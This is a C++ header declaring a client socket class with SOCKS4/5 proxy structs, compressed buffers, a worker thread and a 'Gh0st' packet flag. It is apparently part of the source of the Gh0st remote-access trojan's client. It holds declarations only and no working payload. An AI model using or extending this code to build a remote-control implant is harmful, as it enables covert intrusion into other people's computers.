// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////
#pragma once

#include <winsock2.h>
#include <mswsock.h>
#include "Buffer.h"
#include "Manager.h"


// Change at your Own Peril

// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
#define HDR_SIZE	13
#define FLAG_SIZE	5

enum
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};

struct socks5req1
{
    char Ver;
    char nMethods;
    char Methods[2];
};

struct socks5ans1
{
    char Ver;
    char Method;
};

struct socks5req2
{
    char Ver;
    char Cmd;
    char Rsv;
    char Atyp;
    unsigned long IPAddr;
    unsigned short Port;
    
	//    char other[1];
};

struct socks5ans2
{
    char Ver;
    char Rep;
    char Rsv;
    char Atyp;
    char other[1];
};

struct authreq
{
    char Ver;
    char Ulen;
    char NamePass[256];
};

struct authans
{
    char Ver;
    char Status;
};

class CClientSocket  
{
	friend class CManager;

public:
	CClientSocket();
	virtual ~CClientSocket();

	bool Connect(LPCSTR lpszHost, UINT nPort);
	void Disconnect();

	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);
	
	void setGlobalProxyOption(int nProxyType = PROXY_NONE, LPCSTR	lpszProxyHost = NULL, UINT nProxyPort = 1080, LPCSTR lpszUserName = NULL, LPCSTR lpszPassWord = NULL);
	
	void run_event_loop();
	bool IsRunning();

private:
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);

	bool ConnectProxyServer(LPCSTR lpszHost, UINT nPort);
	static DWORD WINAPI WorkThread(LPVOID lparam);

public:
	CBuffer m_CompressionBuffer;
	CBuffer m_DeCompressionBuffer;
	CBuffer m_WriteBuffer;
	CBuffer	m_ResendWriteBuffer;

	HANDLE m_hRecvWorkerThread;
	SOCKET m_Socket;
	HANDLE m_hEvent;

private:
	CManager* m_pManager;

	bool m_bIsRunning;
	static BYTE m_byPacketFlag[FLAG_SIZE];

	static int  m_nProxyType;
	static UINT m_nProxyPort;
	static char m_strProxyHost[256];
	static char m_strUserName[256];
	static char m_strPassWord[256];
};
